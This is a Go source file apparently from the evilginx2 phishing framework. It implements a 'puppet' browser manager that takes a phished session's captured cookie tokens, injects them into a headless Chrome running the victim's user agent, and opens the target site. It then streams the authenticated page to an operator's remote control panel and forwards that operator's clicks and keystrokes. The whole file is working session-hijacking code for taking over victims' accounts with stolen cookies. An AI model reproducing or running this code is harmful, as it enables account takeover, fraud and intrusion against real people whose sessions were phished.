package core

import (
	"context"
	"encoding/json"
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/cdproto/input"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/cdproto/runtime"
	"github.com/chromedp/chromedp"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type PuppetStatus int

const (
	PUPPET_STARTING PuppetStatus = iota
	PUPPET_RUNNING
	PUPPET_STOPPED
	PUPPET_ERROR
)

func (s PuppetStatus) String() string {
	switch s {
	case PUPPET_STARTING:
		return "starting"
	case PUPPET_RUNNING:
		return "running"
	case PUPPET_STOPPED:
		return "stopped"
	case PUPPET_ERROR:
		return "error"
	default:
		return "unknown"
	}
}

// DOMUpdate represents a DOM content or input-change update sent to WebSocket clients.
type DOMUpdate struct {
	Type           string `json:"type"`                     // "domupdate", "inputchange", or "url"
	Head           string `json:"head,omitempty"`            // outerHTML of <head>
	Body           string `json:"body,omitempty"`            // outerHTML of <body>
	URL            string `json:"url,omitempty"`             // current page URL
	CSSPath        string `json:"cssPath,omitempty"`         // CSS selector (for inputchange)
	Value          string `json:"value,omitempty"`           // input value (for inputchange)
	SelectionStart int    `json:"selectionStart,omitempty"`  // cursor start (for inputchange)
	SelectionEnd   int    `json:"selectionEnd,omitempty"`    // cursor end (for inputchange)
}

// PuppetInstance represents a single headless Chrome browser session
// controlled via the EvilPuppet DOM-streaming interface.
type PuppetInstance struct {
	Id         int
	SessionId  int
	Phishlet   string
	Username   string
	TargetURL  string
	Status     PuppetStatus
	Error      string
	CreateTime time.Time

	ctx         context.Context
	cancel      context.CancelFunc
	allocCtx    context.Context
	allocCancel context.CancelFunc

	mu            sync.Mutex
	contentCh     chan *DOMUpdate   // DOM updates for WebSocket streaming
	stopCh        chan struct{}
	resourceCache *ResourceCache
	lastUpdate    *DOMUpdate       // most recent full DOM state for new clients
	oldHead       string           // for change detection
	oldBody       string

	viewportW int
	viewportH int
}

// PuppetInput represents an input event forwarded from the web UI to the puppet browser.
type PuppetInput struct {
	Type           string  `json:"type"`
	X              float64 `json:"x,omitempty"`
	Y              float64 `json:"y,omitempty"`
	Button         string  `json:"button,omitempty"`
	Text           string  `json:"text,omitempty"`
	Key            string  `json:"key,omitempty"`
	Code           string  `json:"code,omitempty"`
	DeltaX         float64 `json:"deltaX,omitempty"`
	DeltaY         float64 `json:"deltaY,omitempty"`
	URL            string  `json:"url,omitempty"`
	Modifiers      int     `json:"modifiers,omitempty"`
	CSSPath        string  `json:"cssPath,omitempty"`
	Value          string  `json:"value,omitempty"`
	SelectionStart int     `json:"selectionStart,omitempty"`
	SelectionEnd   int     `json:"selectionEnd,omitempty"`
}

// PuppetManager manages all puppet browser instances.
type PuppetManager struct {
	instances  map[int]*PuppetInstance
	nextId     int
	mu         sync.RWMutex
	db         *database.Database
	cfg        *Config
	server     *PuppetServer
	chromePath string
	port       int
	password   string
}

func NewPuppetManager(cfg *Config, db *database.Database) *PuppetManager {
	pm := &PuppetManager{
		instances:  make(map[int]*PuppetInstance),
		nextId:     1,
		db:         db,
		cfg:        cfg,
		chromePath: "",
		port:       7777,
		password:   GenRandomToken()[:16],
	}
	return pm
}

func (pm *PuppetManager) SetServer(server *PuppetServer) {
	pm.server = server
}

func (pm *PuppetManager) SetChromePath(path string) {
	pm.chromePath = path
}

func (pm *PuppetManager) GetPort() int {
	return pm.port
}

func (pm *PuppetManager) SetPort(port int) {
	pm.port = port
}

func (pm *PuppetManager) GetPassword() string {
	return pm.password
}

func (pm *PuppetManager) SetPassword(password string) {
	pm.password = password
}

// LaunchPuppet creates a new headless Chrome instance, injects the captured cookies
// from the specified session, and navigates to the target URL.
func (pm *PuppetManager) LaunchPuppet(sessionId int, targetURL string) (*PuppetInstance, error) {
	sessions, err := pm.db.ListSessions()
	if err != nil {
		return nil, fmt.Errorf("database error: %v", err)
	}

	var dbSession *database.Session
	for _, s := range sessions {
		if s.Id == sessionId {
			dbSession = s
			break
		}
	}
	if dbSession == nil {
		return nil, fmt.Errorf("session %d not found", sessionId)
	}

	if len(dbSession.CookieTokens) == 0 && len(dbSession.BodyTokens) == 0 && len(dbSession.HttpTokens) == 0 {
		return nil, fmt.Errorf("session %d has no captured tokens", sessionId)
	}

	if targetURL == "" {
		return nil, fmt.Errorf("target URL is required")
	}

	pm.mu.Lock()
	id := pm.nextId
	pm.nextId++
	pm.mu.Unlock()

	puppet := &PuppetInstance{
		Id:            id,
		SessionId:     sessionId,
		Phishlet:      dbSession.Phishlet,
		Username:      dbSession.Username,
		TargetURL:     targetURL,
		Status:        PUPPET_STARTING,
		CreateTime:    time.Now(),
		contentCh:     make(chan *DOMUpdate, 5),
		stopCh:        make(chan struct{}),
		resourceCache: NewResourceCache(id),
		viewportW:     1920,
		viewportH:     1080,
	}

	pm.mu.Lock()
	pm.instances[id] = puppet
	pm.mu.Unlock()

	go pm.runPuppet(puppet, dbSession)

	return puppet, nil
}

func (pm *PuppetManager) runPuppet(puppet *PuppetInstance, dbSession *database.Session) {
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("disable-web-security", false),
		chromedp.Flag("disable-features", "VizDisplayCompositor"),
		chromedp.WindowSize(puppet.viewportW, puppet.viewportH),
		chromedp.UserAgent(dbSession.UserAgent),
	)

	if pm.chromePath != "" {
		opts = append(opts, chromedp.ExecPath(pm.chromePath))
	}

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	puppet.allocCtx = allocCtx
	puppet.allocCancel = allocCancel

	ctx, cancel := chromedp.NewContext(allocCtx)
	puppet.ctx = ctx
	puppet.cancel = cancel

	// Navigate to about:blank first to establish the browser
	if err := chromedp.Run(ctx, chromedp.Navigate("about:blank")); err != nil {
		puppet.mu.Lock()
		puppet.Status = PUPPET_ERROR
		puppet.Error = fmt.Sprintf("failed to start browser: %v", err)
		puppet.mu.Unlock()
		log.Error("puppet [%d]: %s", puppet.Id, puppet.Error)
		return
	}

	// Auto-dismiss JavaScript dialogs
	chromedp.ListenTarget(ctx, func(ev interface{}) {
		switch ev.(type) {
		case *page.EventJavascriptDialogOpening:
			go chromedp.Run(ctx, page.HandleJavaScriptDialog(true))
		}
	})

	// Inject all captured cookies from the session
	cookieCount := 0
	for domain, cookies := range dbSession.CookieTokens {
		for _, ck := range cookies {
			err := chromedp.Run(ctx, chromedp.ActionFunc(func(ctx context.Context) error {
				expr := cdp.TimeSinceEpoch(time.Now().Add(180 * 24 * time.Hour))
				cookiePath := "/"
				if ck.Path != "" {
					cookiePath = ck.Path
				}
				return network.SetCookie(ck.Name, ck.Value).
					WithDomain(domain).
					WithPath(cookiePath).
					WithSecure(true).
					WithHTTPOnly(ck.HttpOnly).
					WithExpires(&expr).
					Do(ctx)
			}))
			if err != nil {
				log.Warning("puppet [%d]: failed to set cookie %s@%s: %v", puppet.Id, ck.Name, domain, err)
			} else {
				cookieCount++
			}
		}
	}
	log.Success("puppet [%d]: injected %d cookies from session %d", puppet.Id, cookieCount, puppet.SessionId)

	// Set up input change listener for real-time text sync
	SetupInputChangeListener(puppet)

	// Navigate to the target URL
	log.Info("puppet [%d]: navigating to %s", puppet.Id, puppet.TargetURL)
	if err := chromedp.Run(ctx, chromedp.Navigate(puppet.TargetURL)); err != nil {
		puppet.mu.Lock()
		puppet.Status = PUPPET_ERROR
		puppet.Error = fmt.Sprintf("failed to navigate: %v", err)
		puppet.mu.Unlock()
		log.Error("puppet [%d]: %s", puppet.Id, puppet.Error)
		return
	}

	// Wait for initial page load
	time.Sleep(3 * time.Second)

	puppet.mu.Lock()
	puppet.Status = PUPPET_RUNNING
	puppet.mu.Unlock()

	log.Success("puppet [%d]: browser running - session %d (%s) -> %s", puppet.Id, puppet.SessionId, puppet.Username, puppet.TargetURL)

	serverIP := pm.cfg.GetServerExternalIP()
	if serverIP == "" {
		serverIP = "your-server-ip"
	}
	controlURL := fmt.Sprintf("http://%s:%d/puppet/%d?key=%s", serverIP, pm.port, puppet.Id, pm.password)
	log.Info("puppet [%d]: control URL: %s", puppet.Id, controlURL)

	// Start the DOM content streaming loop
	go DomStreamLoop(puppet)

	// Wait for stop signal
	<-puppet.stopCh

	puppet.mu.Lock()
	puppet.Status = PUPPET_STOPPED
	puppet.mu.Unlock()

	cancel()
	allocCancel()
	log.Info("puppet [%d]: stopped", puppet.Id)
}

// SetupInputChangeListener injects JavaScript into the puppet browser that watches
// for input field changes and sends them immediately through a binding, providing
// near-instant text synchronization (like EvilPuppetJS's setupPuppeteerChangeListeners).
func SetupInputChangeListener(puppet *PuppetInstance) {
	chromedp.Run(puppet.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
		// Create a binding that JS can call to notify us of input changes
		if err := runtime.AddBinding("__puppetInputChanged").Do(ctx); err != nil {
			return err
		}
		// Inject the listener into every new document (survives navigations)
		_, err := page.AddScriptToEvaluateOnNewDocument(inputListenerScript).Do(ctx)
		return err
	}))

	// Listen for binding calls and forward input changes to the client
	chromedp.ListenTarget(puppet.ctx, func(ev interface{}) {
		switch e := ev.(type) {
		case *runtime.EventBindingCalled:
			if e.Name == "__puppetInputChanged" {
				var inputData struct {
					CSSPath        string `json:"cssPath"`
					Value          string `json:"value"`
					SelectionStart int    `json:"selectionStart"`
					SelectionEnd   int    `json:"selectionEnd"`
				}
				if err := json.Unmarshal([]byte(e.Payload), &inputData); err != nil {
					return
				}
				update := &DOMUpdate{
					Type:           "inputchange",
					CSSPath:        inputData.CSSPath,
					Value:          inputData.Value,
					SelectionStart: inputData.SelectionStart,
					SelectionEnd:   inputData.SelectionEnd,
				}
				select {
				case puppet.contentCh <- update:
				default:
				}
			}
		}
	})
}

// DomStreamLoop continuously extracts the DOM from the puppet browser and sends updates
// to connected WebSocket clients. This is the core of the EvilPuppet DOM-streaming approach.
func DomStreamLoop(puppet *PuppetInstance) {
	ticker := time.NewTicker(300 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-puppet.stopCh:
			return
		case <-ticker.C:
			puppet.mu.Lock()
			status := puppet.Status
			puppet.mu.Unlock()

			if status != PUPPET_RUNNING {
				continue
			}

			update, err := ExtractPageDOM(puppet)
			if err != nil {
				continue
			}

			if update != nil {
				// Drain any stale DOM update, then send the new one
				select {
				case <-puppet.contentCh:
				default:
				}
				select {
				case puppet.contentCh <- update:
				default:
				}
			}
		}
	}
}

// domExtractionResult is the Go struct matching the JSON returned by the extraction JavaScript.
type domExtractionResult struct {
	Head      string   `json:"head"`
	Body      string   `json:"body"`
	URL       string   `json:"url"`
	Resources []string `json:"resources"`
}

// ExtractPageDOM evaluates JavaScript in the puppet browser to extract the processed page DOM.
// It strips scripts, rewrites resource URLs to go through the proxy, and syncs input values.
// Returns nil if nothing has changed since the last extraction.
func ExtractPageDOM(puppet *PuppetInstance) (*DOMUpdate, error) {
	script := strings.ReplaceAll(extractDOMScript, "PUPPET_ID_PLACEHOLDER", strconv.Itoa(puppet.Id))

	var resultJSON string
	evalCtx, evalCancel := context.WithTimeout(puppet.ctx, 5*time.Second)
	defer evalCancel()

	err := chromedp.Run(evalCtx, chromedp.Evaluate(script, &resultJSON))
	if err != nil {
		return nil, err
	}

	var result domExtractionResult
	if err := json.Unmarshal([]byte(resultJSON), &result); err != nil {
		return nil, err
	}

	// Check for changes
	puppet.mu.Lock()
	headChanged := puppet.oldHead != result.Head
	bodyChanged := puppet.oldBody != result.Body
	puppet.oldHead = result.Head
	puppet.oldBody = result.Body
	puppet.mu.Unlock()

	if !headChanged && !bodyChanged {
		return nil, nil
	}

	update := &DOMUpdate{
		Type: "domupdate",
		URL:  result.URL,
	}
	if headChanged {
		update.Head = result.Head
	}
	if bodyChanged {
		update.Body = result.Body
	}

	// Store full state for newly connecting clients
	puppet.mu.Lock()
	puppet.lastUpdate = &DOMUpdate{
		Type: "domupdate",
		Head: result.Head,
		Body: result.Body,
		URL:  result.URL,
	}
	puppet.mu.Unlock()

	// Background-fetch and cache referenced resources
	if puppet.resourceCache != nil {
		for _, resURL := range result.Resources {
			resURL := resURL
			go puppet.resourceCache.FetchAndCache(resURL)
		}
	}

	return update, nil
}

// HandleInput dispatches an input event to the puppet's headless Chrome instance.
func (pm *PuppetManager) HandleInput(puppetId int, pi PuppetInput) error {
	pm.mu.RLock()
	puppet, ok := pm.instances[puppetId]
	pm.mu.RUnlock()

	if !ok {
		return fmt.Errorf("puppet %d not found", puppetId)
	}

	puppet.mu.Lock()
	status := puppet.Status
	puppet.mu.Unlock()

	if status != PUPPET_RUNNING {
		return fmt.Errorf("puppet %d is not running (status: %s)", puppetId, status)
	}

	switch pi.Type {
	case "click":
		return pm.handleCSSClick(puppet, pi)
	case "type":
		return pm.handleType(puppet, pi)
	case "keypress":
		return pm.handleKeyPress(puppet, pi)
	case "keydown":
		return pm.handleKeyDown(puppet, pi)
	case "keyup":
		return pm.handleKeyUp(puppet, pi)
	case "scroll":
		return pm.handleScroll(puppet, pi)
	case "selectionchange":
		return pm.handleSelectionChange(puppet, pi)
	case "navigate":
		return pm.handleNavigate(puppet, pi)
	case "back":
		return pm.handleBack(puppet)
	case "forward":
		return pm.handleForward(puppet)
	case "refresh":
		return pm.handleRefresh(puppet)
	}
	return nil
}

// handleCSSClick clicks an element in the puppet browser identified by its CSS selector path.
func (pm *PuppetManager) handleCSSClick(puppet *PuppetInstance, pi PuppetInput) error {
	if pi.CSSPath == "" {
		return nil
	}
	cssPathJSON, _ := json.Marshal(pi.CSSPath)
	var ignored interface{}
	return chromedp.Run(puppet.ctx, chromedp.Evaluate(fmt.Sprintf(`
		(function(path) {
			var el = document.querySelector(path);
			if (!el) return false;
			el.click();
			if (el.focus) el.focus();
			if ((el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') && el.value !== undefined) {
				el.selectionStart = el.selectionEnd = el.value.length;
			}
			return true;
		})(%s)
	`, string(cssPathJSON)), &ignored))
}

// handleKeyPress handles a key press event (EvilPuppetJS-style: single press = down+char+up).
func (pm *PuppetManager) handleKeyPress(puppet *PuppetInstance, pi PuppetInput) error {
	keyName := pi.Key
	if keyName == "" {
		keyName = pi.Text
	}
	if keyName == "" {
		return nil
	}

	switch keyName {
	case "CtrlBackspace":
		return chromedp.Run(puppet.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
			input.DispatchKeyEvent(input.KeyDown).WithKey("Control").WithCode("ControlLeft").WithWindowsVirtualKeyCode(17).WithNativeVirtualKeyCode(17).Do(ctx)
			input.DispatchKeyEvent(input.KeyDown).WithKey("Backspace").WithCode("Backspace").WithWindowsVirtualKeyCode(8).WithNativeVirtualKeyCode(8).Do(ctx)
			input.DispatchKeyEvent(input.KeyUp).WithKey("Backspace").WithCode("Backspace").Do(ctx)
			input.DispatchKeyEvent(input.KeyUp).WithKey("Control").WithCode("ControlLeft").Do(ctx)
			return nil
		}))
	case "CtrlZ":
		return chromedp.Run(puppet.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
			input.DispatchKeyEvent(input.KeyDown).WithKey("Control").WithCode("ControlLeft").WithWindowsVirtualKeyCode(17).WithNativeVirtualKeyCode(17).Do(ctx)
			input.DispatchKeyEvent(input.KeyDown).WithKey("z").WithCode("KeyZ").Do(ctx)
			input.DispatchKeyEvent(input.KeyUp).WithKey("z").WithCode("KeyZ").Do(ctx)
			input.DispatchKeyEvent(input.KeyUp).WithKey("Control").WithCode("ControlLeft").Do(ctx)
			return nil
		}))
	case "CtrlY":
		return chromedp.Run(puppet.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
			input.DispatchKeyEvent(input.KeyDown).WithKey("Control").WithCode("ControlLeft").WithWindowsVirtualKeyCode(17).WithNativeVirtualKeyCode(17).Do(ctx)
			input.DispatchKeyEvent(input.KeyDown).WithKey("y").WithCode("KeyY").Do(ctx)
			input.DispatchKeyEvent(input.KeyUp).WithKey("y").WithCode("KeyY").Do(ctx)
			input.DispatchKeyEvent(input.KeyUp).WithKey("Control").WithCode("ControlLeft").Do(ctx)
			return nil
		}))
	default:
		return chromedp.Run(puppet.ctx, chromedp.ActionFunc(func(ctx context.Context) error {
			if len(keyName) == 1 {
				// Printable character — use KeyChar for reliable input
				return input.DispatchKeyEvent(input.KeyChar).WithText(keyName).Do(ctx)
			}
			// Special key — dispatch KeyDown then KeyUp with modifiers
			evtDown := input.DispatchKeyEvent(input.KeyDown).WithKey(keyName)
			if pi.Code != "" {
				evtDown = evtDown.WithCode(pi.Code)
			}
			if pi.Modifiers != 0 {
				evtDown = evtDown.WithModifiers(input.Modifier(pi.Modifiers))
			}
			if vk, ok := keyToVirtualKeyCode(keyName); ok {
				evtDown = evtDown.WithWindowsVirtualKeyCode(vk).WithNativeVirtualKeyCode(vk)
			}
			if err := evtDown.Do(ctx); err != nil {
				return err
			}
			evtUp := input.DispatchKeyEvent(input.KeyUp).WithKey(keyName)
			if pi.Code != "" {
				evtUp = evtUp.WithCode(pi.Code)
			}
			if pi.Modifiers != 0 {
				evtUp = evtUp.WithModifiers(input.Modifier(pi.Modifiers))
			}
			return evtUp.Do(ctx)
		}))
	}
}

func (pm *PuppetManager) handleType(puppet *PuppetInstance, pi PuppetInput) error {
	for _, ch := range pi.Text {
		err := chromedp.Run(puppet.ctx,
			chromedp.ActionFunc(func(ctx context.Context) error {
				return input.DispatchKeyEvent(input.KeyChar).
					WithText(string(ch)).
					Do(ctx)
			}),
		)
		if err != nil {
			return err
		}
	}
	return nil
}

func (pm *PuppetManager) handleKeyDown(puppet *PuppetInstance, pi PuppetInput) error {
	return chromedp.Run(puppet.ctx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			evt := input.DispatchKeyEvent(input.KeyDown).
				WithKey(pi.Key).
				WithCode(pi.Code).
				WithModifiers(input.Modifier(pi.Modifiers))

			if vk, ok := keyToVirtualKeyCode(pi.Key); ok {
				evt = evt.WithWindowsVirtualKeyCode(vk).WithNativeVirtualKeyCode(vk)
			}
			return evt.Do(ctx)
		}),
	)
}

func (pm *PuppetManager) handleKeyUp(puppet *PuppetInstance, pi PuppetInput) error {
	return chromedp.Run(puppet.ctx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			evt := input.DispatchKeyEvent(input.KeyUp).
				WithKey(pi.Key).
				WithCode(pi.Code).
				WithModifiers(input.Modifier(pi.Modifiers))

			if vk, ok := keyToVirtualKeyCode(pi.Key); ok {
				evt = evt.WithWindowsVirtualKeyCode(vk).WithNativeVirtualKeyCode(vk)
			}
			return evt.Do(ctx)
		}),
	)
}

func (pm *PuppetManager) handleScroll(puppet *PuppetInstance, pi PuppetInput) error {
	return chromedp.Run(puppet.ctx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			return input.DispatchMouseEvent(input.MouseWheel, pi.X, pi.Y).
				WithDeltaX(pi.DeltaX).
				WithDeltaY(pi.DeltaY).
				Do(ctx)
		}),
	)
}

// handleSelectionChange updates the text selection/cursor position in an input element.
func (pm *PuppetManager) handleSelectionChange(puppet *PuppetInstance, pi PuppetInput) error {
	if pi.CSSPath == "" {
		return nil
	}
	cssPathJSON, _ := json.Marshal(pi.CSSPath)
	var ignored interface{}
	return chromedp.Run(puppet.ctx, chromedp.Evaluate(fmt.Sprintf(`
		(function(path, start, end) {
			var el = document.querySelector(path);
			if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA')) {
				el.selectionStart = start;
				el.selectionEnd = end;
			}
		})(%s, %d, %d)
	`, string(cssPathJSON), pi.SelectionStart, pi.SelectionEnd), &ignored))
}

func (pm *PuppetManager) handleNavigate(puppet *PuppetInstance, pi PuppetInput) error {
	targetURL := pi.URL
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}
	log.Info("puppet [%d]: navigating to %s", puppet.Id, targetURL)
	return chromedp.Run(puppet.ctx, chromedp.Navigate(targetURL))
}

func (pm *PuppetManager) handleBack(puppet *PuppetInstance) error {
	return chromedp.Run(puppet.ctx, chromedp.NavigateBack())
}

func (pm *PuppetManager) handleForward(puppet *PuppetInstance) error {
	return chromedp.Run(puppet.ctx, chromedp.NavigateForward())
}

func (pm *PuppetManager) handleRefresh(puppet *PuppetInstance) error {
	return chromedp.Run(puppet.ctx, chromedp.Reload())
}

// GetContentChan returns the DOM content channel for live streaming.
func (pm *PuppetManager) GetContentChan(puppetId int) (chan *DOMUpdate, error) {
	pm.mu.RLock()
	puppet, ok := pm.instances[puppetId]
	pm.mu.RUnlock()

	if !ok {
		return nil, fmt.Errorf("puppet %d not found", puppetId)
	}
	return puppet.contentCh, nil
}

// GetResourceCache returns the resource cache for a puppet.
func (pm *PuppetManager) GetResourceCache(puppetId int) (*ResourceCache, error) {
	pm.mu.RLock()
	puppet, ok := pm.instances[puppetId]
	pm.mu.RUnlock()

	if !ok {
		return nil, fmt.Errorf("puppet %d not found", puppetId)
	}
	return puppet.resourceCache, nil
}

// GetLastUpdate returns the most recent full DOM state for initial client connection.
func (pm *PuppetManager) GetLastUpdate(puppetId int) *DOMUpdate {
	pm.mu.RLock()
	puppet, ok := pm.instances[puppetId]
	pm.mu.RUnlock()

	if !ok {
		return nil
	}

	puppet.mu.Lock()
	defer puppet.mu.Unlock()
	return puppet.lastUpdate
}

// GetCurrentURL retrieves the browser's current URL.
func (pm *PuppetManager) GetCurrentURL(puppetId int) (string, error) {
	pm.mu.RLock()
	puppet, ok := pm.instances[puppetId]
	pm.mu.RUnlock()

	if !ok {
		return "", fmt.Errorf("puppet %d not found", puppetId)
	}

	puppet.mu.Lock()
	status := puppet.Status
	puppet.mu.Unlock()

	if status != PUPPET_RUNNING {
		return "", fmt.Errorf("puppet %d is not running", puppetId)
	}

	var currentURL string
	err := chromedp.Run(puppet.ctx, chromedp.Location(&currentURL))
	if err != nil {
		return "", err
	}
	return currentURL, nil
}

// KillPuppet stops a running puppet and cleans up its Chrome instance.
func (pm *PuppetManager) KillPuppet(puppetId int) error {
	pm.mu.RLock()
	puppet, ok := pm.instances[puppetId]
	pm.mu.RUnlock()

	if !ok {
		return fmt.Errorf("puppet %d not found", puppetId)
	}

	puppet.mu.Lock()
	status := puppet.Status
	puppet.mu.Unlock()

	if status == PUPPET_STOPPED {
		return fmt.Errorf("puppet %d already stopped", puppetId)
	}

	select {
	case <-puppet.stopCh:
	default:
		close(puppet.stopCh)
	}

	return nil
}

// KillAllPuppets stops all running puppets.
func (pm *PuppetManager) KillAllPuppets() int {
	pm.mu.RLock()
	ids := make([]int, 0, len(pm.instances))
	for id := range pm.instances {
		ids = append(ids, id)
	}
	pm.mu.RUnlock()

	killed := 0
	for _, id := range ids {
		if err := pm.KillPuppet(id); err == nil {
			killed++
		}
	}
	return killed
}

// ListPuppets returns all puppet instances.
func (pm *PuppetManager) ListPuppets() []*PuppetInstance {
	pm.mu.RLock()
	defer pm.mu.RUnlock()

	var list []*PuppetInstance
	for _, p := range pm.instances {
		list = append(list, p)
	}
	return list
}

// GetPuppet returns a puppet by ID.
func (pm *PuppetManager) GetPuppet(puppetId int) (*PuppetInstance, bool) {
	pm.mu.RLock()
	defer pm.mu.RUnlock()
	p, ok := pm.instances[puppetId]
	return p, ok
}

// GetControlURL returns the full control URL for a puppet.
func (pm *PuppetManager) GetControlURL(puppetId int) string {
	serverIP := pm.cfg.GetServerExternalIP()
	if serverIP == "" {
		serverIP = "your-server-ip"
	}
	return fmt.Sprintf("http://%s:%d/puppet/%d?key=%s", serverIP, pm.port, puppetId, pm.password)
}

// GetDashboardURL returns the URL for the puppet dashboard.
func (pm *PuppetManager) GetDashboardURL() string {
	serverIP := pm.cfg.GetServerExternalIP()
	if serverIP == "" {
		serverIP = "your-server-ip"
	}
	return fmt.Sprintf("http://%s:%d/puppet/?key=%s", serverIP, pm.port, pm.password)
}

// keyToVirtualKeyCode maps JavaScript key names to Windows virtual key codes.
func keyToVirtualKeyCode(key string) (int64, bool) {
	keyMap := map[string]int64{
		"Enter":      13,
		"Tab":        9,
		"Backspace":  8,
		"Delete":     46,
		"Escape":     27,
		"ArrowUp":    38,
		"ArrowDown":  40,
		"ArrowLeft":  37,
		"ArrowRight": 39,
		"Home":       36,
		"End":        35,
		"PageUp":     33,
		"PageDown":   34,
		"Insert":     45,
		"F1":         112,
		"F2":         113,
		"F3":         114,
		"F4":         115,
		"F5":         116,
		"F6":         117,
		"F7":         118,
		"F8":         119,
		"F9":         120,
		"F10":        121,
		"F11":        122,
		"F12":        123,
		"Shift":      16,
		"Control":    17,
		"Alt":        18,
		"Meta":       91,
		" ":          32,
	}
	vk, ok := keyMap[key]
	return vk, ok
}

// extractDOMScript is the JavaScript evaluated in the puppet browser to extract the page DOM.
// It clones the document, strips scripts, rewrites resource URLs to go through the proxy,
// syncs input values, and returns the processed head/body HTML + resource list.
// PUPPET_ID_PLACEHOLDER is replaced with the actual puppet ID before evaluation.
const extractDOMScript = `(function() {
    var puppetId = PUPPET_ID_PLACEHOLDER;
    var resBase = '/puppet/res/' + puppetId + '/?url=';

    function proxyURL(rawURL) {
        if (!rawURL) return rawURL;
        if (rawURL.startsWith('data:') || rawURL.startsWith('blob:') || rawURL.startsWith('javascript:') || rawURL.startsWith('#')) return rawURL;
        if (rawURL.indexOf(resBase) === 0) return rawURL;
        try {
            var absoluteURL = new URL(rawURL, document.baseURI).href;
            return resBase + encodeURIComponent(absoluteURL);
        } catch(e) {
            return rawURL;
        }
    }

    function processCSSText(css) {
        if (!css || css.indexOf('url(') === -1) return css;
        return css.replace(/url\(\s*(['"]?)([^'")\s]+)\1\s*\)/g, function(match, quote, url) {
            if (url.startsWith('data:') || url.startsWith('blob:')) return match;
            return 'url(' + quote + proxyURL(url) + quote + ')';
        });
    }

    var resources = [];
    var clone = document.documentElement.cloneNode(true);

    // Remove scripts and noscripts
    var scripts = clone.querySelectorAll('script, noscript');
    for (var i = scripts.length - 1; i >= 0; i--) scripts[i].parentNode.removeChild(scripts[i]);

    // Remove base tags to prevent URL resolution issues on the client
    var bases = clone.querySelectorAll('base');
    for (var i = bases.length - 1; i >= 0; i--) bases[i].parentNode.removeChild(bases[i]);

    // Process link[href] - stylesheets, icons, etc.
    var links = clone.querySelectorAll('link[href]');
    for (var i = 0; i < links.length; i++) {
        var href = links[i].getAttribute('href');
        if (href) {
            try {
                resources.push(new URL(href, document.baseURI).href);
                links[i].setAttribute('href', proxyURL(href));
            } catch(e) {}
        }
    }

    // Process img[src]
    var imgs = clone.querySelectorAll('img[src]');
    for (var i = 0; i < imgs.length; i++) {
        var src = imgs[i].getAttribute('src');
        if (src && !src.startsWith('data:')) {
            try {
                resources.push(new URL(src, document.baseURI).href);
                imgs[i].setAttribute('src', proxyURL(src));
            } catch(e) {}
        }
    }

    // Process img[srcset]
    var imgsSrcset = clone.querySelectorAll('img[srcset]');
    for (var i = 0; i < imgsSrcset.length; i++) {
        var srcset = imgsSrcset[i].getAttribute('srcset');
        if (srcset) {
            var newSrcset = srcset.replace(/(\S+)(\s+\S+)?/g, function(m, url, descriptor) {
                return proxyURL(url) + (descriptor || '');
            });
            imgsSrcset[i].setAttribute('srcset', newSrcset);
        }
    }

    // Process source[src] and source[srcset]
    var sources = clone.querySelectorAll('source[src], source[srcset]');
    for (var i = 0; i < sources.length; i++) {
        var src = sources[i].getAttribute('src');
        if (src) {
            try {
                resources.push(new URL(src, document.baseURI).href);
                sources[i].setAttribute('src', proxyURL(src));
            } catch(e) {}
        }
        var srcset = sources[i].getAttribute('srcset');
        if (srcset) {
            sources[i].setAttribute('srcset', proxyURL(srcset));
        }
    }

    // Process inline styles containing url()
    var styled = clone.querySelectorAll('[style]');
    for (var i = 0; i < styled.length; i++) {
        var style = styled[i].getAttribute('style');
        if (style && style.indexOf('url(') !== -1) {
            styled[i].setAttribute('style', processCSSText(style));
        }
    }

    // Process <style> tag contents
    var styleTags = clone.querySelectorAll('style');
    for (var i = 0; i < styleTags.length; i++) {
        var css = styleTags[i].textContent;
        if (css && css.indexOf('url(') !== -1) {
            styleTags[i].textContent = processCSSText(css);
        }
    }

    // Process background attributes
    var bgEls = clone.querySelectorAll('[background]');
    for (var i = 0; i < bgEls.length; i++) {
        var bg = bgEls[i].getAttribute('background');
        if (bg) bgEls[i].setAttribute('background', proxyURL(bg));
    }

    // Process [poster] attributes (video elements)
    var posterEls = clone.querySelectorAll('[poster]');
    for (var i = 0; i < posterEls.length; i++) {
        var poster = posterEls[i].getAttribute('poster');
        if (poster) posterEls[i].setAttribute('poster', proxyURL(poster));
    }

    // Sync input values from the live page to the clone
    var realInputs = document.querySelectorAll('input, textarea, select');
    var cloneInputs = clone.querySelectorAll('input, textarea, select');
    for (var i = 0; i < realInputs.length && i < cloneInputs.length; i++) {
        if (realInputs[i].tagName === 'SELECT') {
            var opts = cloneInputs[i].querySelectorAll('option');
            for (var j = 0; j < opts.length; j++) {
                if (opts[j].value === realInputs[i].value) {
                    opts[j].setAttribute('selected', 'selected');
                } else {
                    opts[j].removeAttribute('selected');
                }
            }
        } else if (realInputs[i].type === 'checkbox' || realInputs[i].type === 'radio') {
            if (realInputs[i].checked) {
                cloneInputs[i].setAttribute('checked', 'checked');
            } else {
                cloneInputs[i].removeAttribute('checked');
            }
        } else {
            cloneInputs[i].setAttribute('value', realInputs[i].value || '');
        }
    }

    var headEl = clone.querySelector('head');
    var bodyEl = clone.querySelector('body');

    return JSON.stringify({
        head: headEl ? headEl.outerHTML : '<head></head>',
        body: bodyEl ? bodyEl.outerHTML : '<body></body>',
        url: window.location.href,
        resources: resources
    });
})()`

